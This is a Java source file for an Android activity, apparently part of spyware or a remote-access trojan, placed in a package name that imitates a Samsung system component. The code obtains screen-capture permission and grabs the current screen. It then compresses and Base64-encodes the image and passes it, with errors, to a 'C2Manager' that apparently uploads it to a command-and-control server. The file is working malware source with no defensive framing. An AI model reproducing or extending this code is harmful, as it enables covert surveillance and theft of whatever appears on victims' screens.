package com.samsung.android.usersuite;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

public class ScreenCapActivity extends Activity {

    private static final int REQ_PROJ = 700;
    private MediaProjection projection;
    private ImageReader reader;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        MediaProjectionManager mpm = (MediaProjectionManager)
            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_PROJ);
    }

    @Override
    protected void onActivityResult(int rc, int code, Intent data) {
        super.onActivityResult(rc, code, data);
        if (rc != REQ_PROJ || code != RESULT_OK) { finish(); return; }

        MediaProjectionManager mpm = (MediaProjectionManager)
            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        projection = mpm.getMediaProjection(code, data);

        android.util.DisplayMetrics dm = new android.util.DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(dm);

        reader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 1);
        projection.createVirtualDisplay("sv",
            dm.widthPixels, dm.heightPixels, dm.densityDpi,
            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.getSurface(), null, null);

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                Image img = reader.acquireLatestImage();
                if (img != null) {
                    copy(img, dm);
                } else {
                    finish();
                }
            } catch (Exception e) {
                C2Manager.pushScreenshot(this, mapErr(e.getMessage()));
                finish();
            }
        }, 700);
    }

    private void copy(Image img, android.util.DisplayMetrics dm) {
        try {
            Image.Plane pl = img.getPlanes()[0];
            ByteBuffer buf = pl.getBuffer();
            Bitmap bmp = Bitmap.createBitmap(
                pl.getRowStride() / pl.getPixelStride(), dm.heightPixels,
                Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            // crop row-stride padding
            Bitmap fit = Bitmap.createBitmap(bmp, 0, 0, dm.widthPixels, dm.heightPixels);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            fit.compress(Bitmap.CompressFormat.JPEG, 55, bos);
            Map<String, Object> out = new HashMap<>();
            out.put("body", Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP));
            out.put("w", dm.widthPixels);
            out.put("h", dm.heightPixels);
            out.put("ts", System.currentTimeMillis());
            C2Manager.pushScreenshot(this, out);
        } catch (Exception e) {
            C2Manager.pushScreenshot(this, mapErr(e != null ? e.getMessage() : "copy"));
        } finally {
            try { img.close(); } catch (Exception ignored) {}
            try { projection.stop(); } catch (Exception ignored) {}
            finish();
        }
    }

    private Map<String, Object> mapErr(String msg) {
        Map<String, Object> m = new HashMap<>();
        m.put("error", msg != null ? msg : "unknown");
        m.put("ts", System.currentTimeMillis());
        return m;
    }
}
